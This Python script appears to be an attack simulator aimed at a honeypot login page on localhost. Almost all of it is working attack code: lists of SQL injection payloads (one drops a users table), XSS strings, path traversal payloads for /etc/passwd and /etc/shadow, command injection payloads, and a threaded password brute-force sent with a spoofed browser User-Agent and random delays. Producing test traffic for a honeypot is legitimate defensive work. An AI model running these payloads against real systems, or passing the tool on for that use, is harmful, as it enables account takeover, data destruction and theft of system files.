import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

class HoneypotAttacker:
    def __init__(self, target_url="http://localhost:8080"):
        self.target_url = target_url
        self.login_url = f"{target_url}/login"
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL,NULL--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "admin') OR ('1'='1",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT NULL,NULL,NULL--+",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
            "admin' AND 1=1 AND 'one'='one",
            "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
            "1'; DROP TABLE users--"
        ]

        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "' onmouseover='alert('XSS')",
            "<img src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "'+alert('XSS')+'",
            "\";alert('XSS');//"
        ]

        self.common_passwords = [
            "admin123", "password", "123456", "qwerty",
            "letmein", "dragon", "baseball", "football",
            "monkey", "abc123", "pass123", "master",
            "hello123", "shadow", "superman", "qwerty123",
            "michael", "jennifer", "111111", "welcome"
        ]

    def send_attack(self, username, password):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(self.login_url, data=data, headers=headers, timeout=5)
            print(f"Attack: {username} / {password} - Status: {response.status_code}")
            return response
        except Exception as e:
            print(f"Error during attack: {e}")
            return None

    def sql_injection_attack(self):
        print("\n[+] Starting SQL Injection Attack...")
        for payload in self.sql_injection_payloads:
            self.send_attack(payload, "anything")
            time.sleep(random.uniform(0.5, 2))

    def xss_attack(self):
        print("\n[+] Starting XSS Attack...")
        for payload in self.xss_payloads:
            self.send_attack(payload, payload)
            time.sleep(random.uniform(0.5, 2))

    def bruteforce_attack(self, num_threads=3):
        print("\n[+] Starting Bruteforce Attack...")
        usernames = ['admin', 'administrator', 'root', 'user', 'test']
        
        def worker(username):
            for password in self.common_passwords:
                self.send_attack(username, password)
                time.sleep(random.uniform(0.2, 1))

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(worker, usernames)

    def path_traversal_attack(self):
        print("\n[+] Starting Path Traversal Attack...")
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "../../../etc/shadow",
            "../../windows/system.ini"
        ]
        
        for payload in traversal_payloads:
            self.send_attack(payload, "anything")
            time.sleep(random.uniform(0.5, 2))

    def command_injection_attack(self):
        print("\n[+] Starting Command Injection Attack...")
        command_payloads = [
            "| ls -la",
            "; cat /etc/passwd",
            "& dir",
            "| whoami",
            "; ping -c 4 127.0.0.1",
            "` id `",
            "$(cat /etc/passwd)",
            "> /tmp/test",
            "| net user",
            "; systeminfo"
        ]
        
        for payload in command_payloads:
            self.send_attack(payload, payload)
            time.sleep(random.uniform(0.5, 2))

    def run_all_attacks(self):
        print("[*] Starting comprehensive attack simulation...")
        
        attacks = [
            self.sql_injection_attack,
            self.xss_attack,
            self.bruteforce_attack,
            self.path_traversal_attack,
            self.command_injection_attack
        ]
        
        for attack in attacks:
            try:
                attack()
            except Exception as e:
                print(f"Error during {attack.__name__}: {e}")
            time.sleep(2)

if __name__ == "__main__":
    attacker = HoneypotAttacker("http://localhost:8080")
    attacker.run_all_attacks()
